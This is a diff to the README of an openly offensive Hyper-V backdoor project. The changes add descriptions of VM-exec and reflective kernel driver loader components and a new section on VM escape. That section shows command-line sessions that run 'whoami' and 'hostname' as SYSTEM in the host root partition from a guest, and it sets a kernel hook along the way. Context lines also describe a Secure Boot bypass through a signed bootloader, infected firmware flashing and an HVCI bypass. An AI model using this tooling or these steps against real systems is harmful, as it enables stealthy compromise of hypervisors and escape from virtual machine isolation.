@@ -36,6 +36,12 @@ Backdoor supports 64-bit versions of Windows 10 1709, 1803, 1809, 1903, 1909 and
 
 * `backdoor_client/trustlet_demo` &minus; 3-rd party trustlet project that provides an example of communication between normal world and secure world.
 
+* `backdoor_client/vm_exec_kernel` and `backdoor_client/vm_exec_user` &minus; Kernel mode and user mode components used to execute arbitrary console commands in Hyper-V root partition from the guest operating system (embedded into the `backdoor_client.exe` application).
+
+* `backdoor_client/driver_loader` &minus; NT kernel reflective drivers loader (embedded into the `backdoor_client.exe` application).
+
+* `backdoor_client/driver_loader_sk` &minus; Secure kernel reflective drivers loader (embedded into the `backdoor_client.exe` application).
+
 * `bootkit_installer.ps1` &minus; Program to deploy Hyper-V backdoor as bootkit along with the signed Kaspersky bootloader used for Secure Boot bypass.
 
 * `resources` &minus; 3-rd party binaries used to build `bootkit_installer.ps1` program (see "building from the source code" section for more details).
@@ -117,7 +123,7 @@ After that you have to replace original driver image with `Bds_infected.efi` one
 > flashrom -p ft2232_spi:type=2232H,port=A –w firmware_infected.bin
 ```
 
-## Usage
+## Basic usage
 
 Client program `backdoor_client.exe` is used to interact with the backdoor from Hyper-V guest or host partition. 
 
@@ -325,7 +331,63 @@ EPT PDPTE 0x145f9000[0x0]: 0x14612007
 0xfffff8017d1d5000 -> 0x00000000033d5000
 ```
 
-Loading arbitrary kernel drivers into the specified hypervisor partition from any guest or host poratition:
+## VM escape related commands
+
+Execute arbitrary console commands in Hyper-V root partition from the guest operating system:
+
+```
+> .\backdoor_client.exe 0 --ept-list
+[+] Running on CPU #0
+[+] Collecting EPT address list...
+[+] Reading collected data from 0xfffff86fff000b80...
+
+  #00: VPID = 0x73f8, EPT = 0x0000000137e1405e [current]
+  #01: VPID = 0x0002, EPT = 0x000000010143701e
+  #02: VPID = 0x002c, EPT = 0x000000010143301e
+
+> .\backdoor_client.exe 0 --vm-exec 0x10143701e "whoami"
+[+] Running on CPU #0
+[+] Loading VM exec drvier...
+[+] Current CR3 value is 0x0000000075d00001
+[+] Current EPT address is 0x0000000137e1405e
+[+] Guest EPT is at 0x000000010143701e
+[+] Found valid PROCESSOR_START_BLOCK at 0x0000000000001000
+
+   CompletionFlag: 0x00000001
+     HalpLMStub(): 0xfffff80406799760
+     PML4 address: 0x1ad000
+
+[+] Locating kernel image in memory, it might take a while...
+[+] Kernel is at 0xfffff80406400000 (physical: 0x2c00000)
+[+] Kernel INIT section is at nt+d55000 (size: 0x17c44)
+[+] Kernel PAGEKD section is at nt+934000 (size: 0x5b92)
+[+] nt!NtReadFile() is at 0xfffff804069e7690 (physical: 0x31e7690)
+[+] Driver loader virtual address is 0xfffff80406d35000 (size: 0x5000)
+[+] Spin lock physical address is 0x592fff8
+[+] Patch size is 15 bytes
+[+] nt!NtReadFile() hook was set: 0xfffff804069e7690 -> 0xfffff80406d37d70
+[+] Waiting for the payload driver to be executed...
+[+] Payload driver was executed!
+[+] Performing cleanup...
+[+] DONE
+[+] VM exec drvier was loaded
+[+] Guest CR3 value is 0x00000000515ec002
+[+] VM_EXEC_STRUCT physical address is 0x00000000817db060
+[+] Command output address is 000002343F460000 (4096 bytes)
+
+nt authority\system
+
+> .\backdoor_client.exe 0 --vm-exec 0x10143701e "hostname"
+[+] Running on CPU #0
+[+] VM exec drvier is already loaded
+[+] Guest CR3 value is 0x00000000515ec002
+[+] VM_EXEC_STRUCT physical address is 0x00000000817db060
+[+] Command output address is 000002343F460000 (4096 bytes)
+
+DESKTOP-HFU6MQ2
+```
+
+Loading arbitrary kernel drivers into the specified hypervisor partition from any guest or host operating system:
 
 ```
 > .\backdoor_client.exe 0 --ept-list
@@ -366,6 +428,8 @@ Loading arbitrary kernel drivers into the specified hypervisor partition from an
 <img src="https://raw.githubusercontent.com/Cr4sh/s6_pcie_microblaze/master/docs/images/backdoor_vm_inject.png" width="749" height="498">
 
 This functionality also can be used for [Hypervisor-Protected Code Integrity](https://docs.microsoft.com/en-us/windows-hardware/drivers/bringup/device-guard-and-credential-guard) (HVCI) bypass to load arbitrary kernel drivers.
+
+## Secure kernel related commands
 
 Show basic information about secure kernel running in VTL1:
 
